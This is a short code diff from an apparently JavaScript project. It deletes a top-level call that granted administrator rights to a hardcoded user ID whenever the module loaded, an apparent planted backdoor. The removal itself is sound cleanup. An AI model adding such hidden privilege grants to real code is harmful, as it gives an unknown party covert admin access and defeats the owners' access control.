@@ -35,8 +35,6 @@ if (legacyAccessTable) {
   })();
 }
 
-setAdminRole(520249397);
-
 export function setAdminRole(userID) {
   const stmt = db.prepare(
     "INSERT OR REPLACE INTO admins (userID, role) VALUES (?, ?)",
